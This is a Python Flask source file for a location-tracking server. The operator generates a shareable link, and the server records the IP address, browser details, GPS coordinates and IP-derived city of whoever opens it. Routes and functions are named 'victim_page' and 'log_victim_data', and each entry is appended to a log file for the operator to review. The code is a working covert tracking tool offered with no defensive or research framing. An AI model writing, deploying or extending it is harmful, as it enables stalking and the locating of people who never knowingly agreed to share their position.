import os
import uuid
import json
from flask import Flask, request, redirect, render_template, jsonify
from datetime import datetime, timedelta
from threading import Lock
import requests
import pytz
import secrets

app = Flask(__name__)
SESSIONS = {}
lock = Lock()

# Storage folders
os.makedirs("logs", exist_ok=True)

# In-memory mappings
tracking_links = {}
session_tracking_links = {}

INDIA_TZ = pytz.timezone("Asia/Kolkata")


def generate_id():
    return secrets.token_hex(8)


@app.route('/')
def home():
    session_id = uuid.uuid4().hex[:12]
    return redirect(f"/session/{session_id}")


@app.route('/api/create_link/<session_id>', methods=['POST'])
def create_link(session_id):
    with lock:
        if session_id not in SESSIONS:
            return jsonify({"error": "Invalid session ID"}), 404
        if session_id in session_tracking_links:
            tracking_id = session_tracking_links[session_id]
        else:
            tracking_id = generate_id()
            session_tracking_links[session_id] = tracking_id
            tracking_links[tracking_id] = session_id
            SESSIONS[session_id]['tracking_id'] = tracking_id
        tracking_url = f"https://example.com/track/{tracking_id}"
        return jsonify({"link": tracking_url})


@app.route('/session/<session_id>')
def session_view(session_id):
    with lock:
        if session_id not in SESSIONS:
            tracking_id = generate_id()
            SESSIONS[session_id] = {
                "created": datetime.utcnow(),
                "tracking_id": tracking_id,
                "logs": [],
                "ips_logged": set()
            }
            tracking_links[tracking_id] = session_id
            session_tracking_links[session_id] = tracking_id
        else:
            tracking_id = SESSIONS[session_id]['tracking_id']
            # Rebuild mappings in case they were lost
            tracking_links[tracking_id] = session_id
            session_tracking_links[session_id] = tracking_id

    tracking_url = f"https://example.com/track/{tracking_id}"
    return render_template("session.html", session_id=session_id, tracking_url=tracking_url)


@app.route('/track/<tracking_id>')
def victim_page(tracking_id):
    session_id = tracking_links.get(tracking_id)
    if not session_id:
        return "Session not found", 404
    return render_template("track.html", tracking_id=session_id)


@app.route('/api/log/<session_id>', methods=['POST'])
def log_victim_data(session_id):
    if session_id not in SESSIONS:
        return jsonify({"error": "Session expired or invalid."}), 404

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip in SESSIONS[session_id]["ips_logged"]:
        return jsonify({"status": "already_logged"}), 200

    ua = request.headers.get("User-Agent")
    data = request.get_json(force=True)

    try:
        geo = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
    except:
        geo = {}

    timestamp = datetime.utcnow().astimezone(INDIA_TZ).strftime("%Y-%m-%d %I:%M:%S %p IST")

    entry = {
        "timestamp": timestamp,
        "ip": ip,
        "ua": ua,
        "lat": data.get("latitude"),
        "lon": data.get("longitude"),
        "acc": data.get("accuracy"),
        "gps_failed": data.get("gps_failed", False),
        "geo": geo
    }

    with lock:
        SESSIONS[session_id]["logs"].append(entry)
        SESSIONS[session_id]["ips_logged"].add(ip)

    city = geo.get("city", "Unknown")
    region = geo.get("region", "Unknown")
    country = geo.get("country_name", "Unknown")

    log_output = (
        f"Access Time: {timestamp}\n"
        f"IP Address: {ip}\n"
        f"Browser Details: {ua}\n"
    )
    if entry['gps_failed']:
        log_output += "Latitude and Longitude: GPS: Not Available\n"
    else:
        log_output += f"Latitude and Longitude: GPS: lat={entry['lat']} lon={entry['lon']} ±{entry['acc']}m\n"

    log_output += f"Location: City: {city}, Region: {region}, Country: {country}\n"
    log_output += f"Other details: N/A\n\n"

    with open("logs/access_log.txt", "a") as f:
        f.write(log_output)

    return jsonify({"status": "ok"})


@app.route('/api/session/<session_id>')
def get_session_logs(session_id):
    with lock:
        session = SESSIONS.get(session_id)
        if not session:
            return jsonify({"error": "Session expired."}), 404
        return jsonify({
            "logs": session["logs"],
            "tracking_id": session["tracking_id"]
        })


def expire_old_sessions():
    now = datetime.utcnow()
    with lock:
        for sid in list(SESSIONS):
            if now - SESSIONS[sid]["created"] > timedelta(hours=12):
                del SESSIONS[sid]


if __name__ == '__main__':
    print("✅ Tracker server starting at 0.0.0.0:5959 ...")
    app.run(host='0.0.0.0', port=5959)
